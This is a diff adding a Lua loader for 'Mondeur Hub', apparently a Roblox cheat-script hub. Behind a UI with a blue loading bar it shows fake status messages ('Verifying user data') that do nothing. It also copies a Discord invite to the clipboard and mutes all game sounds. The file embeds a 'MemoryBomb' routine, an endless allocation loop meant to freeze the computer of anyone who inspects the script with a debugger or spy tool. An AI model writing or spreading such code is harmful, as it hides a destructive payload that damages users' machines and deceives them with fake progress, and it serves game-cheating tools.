@@ -1,0 +1,105 @@
+-- [[ MONDEUR HUB: STEADY PREMIUM VERSION ]]
+-- Features: Instant Copy, Blue Theme, Heavy Protection, Memory Bomb
+
+-- [1. SECURITY SERVICES & CACHING]
+local cloneref = (type(cloneref) == "function" and cloneref) or function(...) return ... end
+local game = game
+local task = task
+local math = math
+
+-- [2. THE PUNISHMENT: MEMORY BOMB]
+-- If any protection is tripped, this freezes the leaker's PC
+local function MemoryBomb()
+    local buffers = {}
+    while true do
+        task.spawn(function() 
+            table.insert(buffers, buffer.create(math.random(1024, 65535))) 
+        end)
+    end
+end
+
+-- [3. ENVIRONMENT & TABLE PROTECTION]
+-- Detects if someone is using a debugger or "Spy" tool
+local success_env = pcall(function() return next(getmetatable(getfenv()).__index) end)
+if not success_env then return MemoryBomb() end
+
+local success_tbl = pcall(function() return getmetatable(coroutine).__index end)
+if success_tbl then return MemoryBomb() end
+
+-- [4. INSTANT INITIALIZATION]
+-- Instant Discord Copy
+if setclipboard then setclipboard("https://discord.gg/S72bS96NV3") end
+
+-- Instant Mute
+for _, sound in ipairs(game:GetDescendants()) do
+    if sound:IsA("Sound") then sound.Volume = 0 end
+end
+
+-- [5. PREMIUM UI CONSTRUCTION (STEADY LOOK)]
+local CoreGui = cloneref(game:GetService("CoreGui"))
+local Players = cloneref(game:GetService("Players"))
+local TweenService = cloneref(game:GetService("TweenService"))
+
+local sg = Instance.new("ScreenGui", CoreGui)
+sg.Name = "MondeurHub_Steady"
+
+-- Main Dark Frame
+local main = Instance.new("Frame", sg)
+main.AnchorPoint = Vector2.new(0.5, 0.5)
+main.Position = UDim2.new(0.5, 0, 0.5, 0)
+main.Size = UDim2.new(0, 500, 0, 350)
+main.BackgroundColor3 = Color3.fromRGB(11, 8, 22) -- Your requested black
+main.BorderSizePixel = 0
+
+local corner = Instance.new("UICorner", main)
+corner.CornerRadius = UDim.new(0, 10)
+
+local stroke = Instance.new("UIStroke", main)
+stroke.Color = Color3.fromRGB(0, 180, 255) -- Premium Blue
+stroke.Thickness = 1.5
+
+-- Mondeur Hub Name
+local title = Instance.new("TextLabel", main)
+title.Size = UDim2.new(1, 0, 0, 60)
+title.Position = UDim2.new(0, 0, 0, 20)
+title.BackgroundTransparency = 1
+title.Text = "MONDEUR HUB"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.Font = Enum.Font.GothamBlack
+title.TextSize = 26
+
+-- The "Fake Chats" / Status (Steady Text)
+local status = Instance.new("TextLabel", main)
+status.Size = UDim2.new(1, -60, 0, 100)
+status.Position = UDim2.new(0, 30, 0, 100)
+status.BackgroundTransparency = 1
+status.Text = "> Fetching latest scripts...\n> Optimizing performance...\n> Securing connection...\n> Bypassing internal engine v2...\n> Verifying user data..."
+status.TextColor3 = Color3.fromRGB(160, 142, 200)
+status.Font = Enum.Font.Code
+status.TextSize = 15
+status.TextXAlignment = Enum.TextXAlignment.Left
+status.LineHeight = 1.5
+
+-- Loading Bar
+local barBg = Instance.new("Frame", main)
+barBg.Size = UDim2.new(0, 440, 0, 6)
+barBg.Position = UDim2.new(0.5, -220, 0, 240)
+barBg.BackgroundColor3 = Color3.fromRGB(25, 20, 45)
+Instance.new("UICorner", barBg)
+
+local bar = Instance.new("Frame", barBg)
+bar.Size = UDim2.new(0, 0, 1, 0)
+bar.BackgroundColor3 = Color3.fromRGB(0, 180, 255) -- Blue Progress
+Instance.new("UICorner", bar)
+
+-- [6. EXECUTION]
+task.spawn(function()
+    -- Smooth Blue Bar Loading
+    TweenService:Create(bar, TweenInfo.new(4, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Size = UDim2.new(1, 0, 1, 0)}):Play()
+    
+    task.wait(4.2)
+    sg:Destroy() -- Removes UI after loading
+    
+    print("Mondeur Hub: Access Granted.")
+    -- [[ PASTE YOUR MAIN SCRIPT FEATURES BELOW THIS LINE ]]
+end)
